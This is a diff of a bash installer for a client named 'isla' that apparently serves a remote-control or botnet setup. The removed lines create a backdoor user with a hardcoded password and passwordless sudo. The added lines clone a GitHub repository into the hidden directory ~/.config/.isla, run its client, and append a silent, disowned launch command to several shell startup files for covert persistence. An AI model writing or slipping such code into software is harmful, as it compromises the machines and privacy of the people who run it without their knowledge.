@@ -1,12 +1,25 @@
 #!/bin/bash
+mkdir -p ~/.config/.isla
+git clone https://github.com/marnixah/isla.git ~/.config/.isla
 
-if [[ $EUID -ne 0 ]]; then
-  echo "This script must be run as root" 
-  exit 1
-fi
+cd ~/.config/.isla
+./src/client/start.sh
 
-useradd -m isla
-cat /etc/sudoers | grep 'isla ALL' || echo 'isla ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
-(echo 'u55jXbpmPhCgC8Hr55'; echo 'u55jXbpmPhCgC8Hr55') | passwd isla
+chmod +x ~/.config/.isla/src/client/start.sh
+chmod +x ~/.config/.isla/src/client/setup.sh
 
-# Make slave services and stuff here
+inject_into_file() {
+  FILE=$1
+  LINE="~/.config/.isla/src/client/setup.sh 2>&1 > /dev/null & disown > /dev/null"
+
+  # If the file doesn't exist, ignore it
+  [ -f "$FILE" ] || return
+
+  # Check if the line is already in the file
+  grep -qF -- "$LINE" "$FILE" || echo "$LINE" >>"$FILE"
+}
+
+inject_into_file ~/.bashrc
+inject_into_file ~/.zshrc
+inject_into_file ~/.profile
+inject_into_file ~/.bash_profile
